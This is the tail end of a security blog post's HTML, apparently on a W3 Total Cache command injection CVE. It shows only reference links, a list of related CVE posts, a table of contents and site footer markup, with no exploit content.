    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://book.hacktricks.wiki/en/pentesting-web/command-injection.html"target="_blank" rel="external nofollow noopener noreferrer">Command Injection</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/w3-total-cache/vulnerability/wordpress-w3-total-cache-plugin-2-8-13-unauthenticated-command-injection-vulnerability"target="_blank" rel="external nofollow noopener noreferrer">WordPress W3 Total Cache Plugin &lt; 2.8.13 is vulnerable to Remote Code Execution (RCE)</a></p></div><hr class="awesome-hr" />
    <h2 id="see-also">Related Content</h2>
    <ul><li>
          <a href="/posts/2025-12-02-cve-2025-52756/" title="CVE-2025-52756 Analysis &amp; POC">CVE-2025-52756 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-12-01-cve-2025-3053/" title="CVE-2025-3053 Analysis &amp; POC">CVE-2025-3053 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-30-cve-2025-32222/" title="CVE-2025-32222 Analysis &amp; POC">CVE-2025-32222 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-28-cve-2025-9321/" title="CVE-2025-9321 Analysis &amp; POC">CVE-2025-9321 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-27-cve-2025-13035/" title="CVE-2025-13035 Analysis &amp; POC">CVE-2025-13035 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-26-cve-2025-26763/" title="CVE-2025-26763 Analysis &amp; POC">CVE-2025-26763 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-25-cve-2025-3439/" title="CVE-2025-3439 Analysis &amp; POC">CVE-2025-3439 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-24-cve-2025-48134/" title="CVE-2025-48134 Analysis &amp; POC">CVE-2025-48134 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-23-cve-2025-30773/" title="CVE-2025-30773 Analysis &amp; POC">CVE-2025-30773 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-21-cve-2025-2939/" title="CVE-2025-2939 Analysis &amp; POC">CVE-2025-2939 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod"><span title="Updated on 2025-11-25 21:12:53">Updated on 2025-11-25&nbsp;<a class="git-hash" href="https://github.com/w41bu1/w41bu1.github.io/commit/5cdc85f0661b8418c6576dd1e38e9367a4445be8" rel="external nofollow noopener noreferrer" target="_blank" title="Update category&#10&#10Commit: 5cdc85f0661b8418c6576dd1e38e9367a4445be8 [5cdc85f]&#10Author: w41bu1&#10Date: 2025-11-25 21:12:53"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i>5cdc85f</a></span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/posts/2025-11-22-cve-2025-9501/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts%5c2025-11-22-CVE-2025-9501%5cindex.en.md?plain=1" title="View source"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">View source</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts%5c2025-11-22-CVE-2025-9501%5cindex.en.md" title="Edit this page"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Edit this page</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20CVE-2025-9501&#43;Analysis&#43;%26&#43;POC&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cCVE-2025-9501&#43;Analysis&#43;%26&#43;POC%7c%0A%7cURL%7chttp://localhost:1313/posts/2025-11-22-cve-2025-9501/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts%5c2025-11-22-CVE-2025-9501%5cindex.en.md?plain=1%7c" title="Report issue"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Report issue</a></span><span><a href="vscode://file/D:%5cwork%5cproject%5cw41bu1.github.io%5ccontent%5cposts%5c2025-11-22-CVE-2025-9501%5cindex.en.md" title="Open in editor"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Open in editor</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/posts/2025-11-22-cve-2025-9501/" data-title="CVE-2025-9501 Analysis &amp; POC" data-hashtags="analyst,plugin,remote code execution"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/2025-11-22-cve-2025-9501/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/posts/2025-11-22-cve-2025-9501/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/posts/2025-11-22-cve-2025-9501/" data-title="CVE-2025-9501 Analysis &amp; POC"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/analyst/" class="post-tag" title="Tags - Analyst">Analyst</a><a href="/tags/plugin/" class="post-tag" title="Tags - Plugin">Plugin</a><a href="/tags/remote-code-execution/" class="post-tag" title="Tags - Remote Code Execution">Remote Code Execution</a></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div><div class="post-nav"><a href="/posts/2025-11-21-cve-2025-2939/" class="post-nav-item" rel="prev" title="CVE-2025-2939 Analysis &amp; POC"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-2939 Analysis &amp; POC</a><a href="/posts/2025-11-23-cve-2025-30773/" class="post-nav-item" rel="next" title="CVE-2025-30773 Analysis &amp; POC">CVE-2025-30773 Analysis &amp; POC<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
      <div class="toc">
        <h2 class="toc-title">Contents</h2>
        <div class="toc-content" id="toc-content-drawer"><nav >
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#cause">Cause</a></li>
    <li><a href="#analysis">Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
  </ul>

  <ul>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div>
    </dialog></main><footer class="footer">
    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
              <a href="github.com/w41bu1">Bui Van Y</a></span><span class="license footer-divider">w41bu1</span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div><div class="footer-line beian"><span class="gov"><i class="fa-solid fa-user-secret"></i></span><span class="icp footer-divider"><i class="fa-solid fa-bug"></i></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><svg viewBox="0 0 100 100">
              <circle class="bg" cx="50" cy="50" r="50"></circle>
              <circle class="progress" cx="50" cy="50" r="50"></circle>
            </svg></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/js/config/66aaa9eaeba529768cee280a5f71833f.js" defer></script><script src="/js/lib/mermaid.js" type="module"></script><script src="/js/theme.min.js" defer></script><script src="/js/flyfish.min.js" defer></script></body>
</html>
